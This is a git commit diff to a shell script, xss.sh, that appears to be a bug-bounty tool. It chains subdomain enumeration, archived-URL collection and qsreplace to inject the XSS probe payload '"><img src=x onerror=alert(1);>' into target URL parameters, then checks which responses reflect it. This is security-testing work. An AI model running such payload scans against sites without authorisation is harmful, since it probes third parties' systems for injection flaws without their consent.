24885e685823acff48365105666e426a3870b725
Aravind Menon <53946198+amaravindmenon@users.noreply.github.com>
2022-07-09 20:37:05 +0530

    Update xss.sh

--- xss.sh
+++ xss.sh
@@ -18,17 +18,16 @@ echo "AMASS STARTED"
 amass enum -passive -norecursive -noalts -d $i -o bugs/$i/domain.txt
 cat bugs/$i/domain.txt | httpx -o bugs/$i/domainhttpx.txt
 
-echo "waybackurls"
-cat bugs/$i/domainhttpx.txt | waybackurls | tee -a bugs/$i/endpoint.txt
+echo "waybackurls || GF || freq"
+cat domainhttpx.txt | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>"' | freq
 
-echo "xssFUZZ"
-cat bugs/$i/endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a bugs/$i/xss_fuzz.txt
-
-echo "finding"
-cat bugs/$i/xss_fuzz.txt | freq | tee -a bugs/$i/possible_xss.txt
+#cat bugs/$i/domainhttpx.txt | waybackurls | tee -a bugs/$i/endpoint.txt
+#echo "xssFUZZ"
+#cat bugs/$i/endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a bugs/$i/xss_fuzz.txt
+#echo "finding"
+#cat bugs/$i/xss_fuzz.txt | freq | tee -a bugs/$i/possible_xss.txt
 
 done
 
 
 #cat domainhttpx.txt | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>"' | freq
-#cat domainhttpx.txt | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>"' | freq
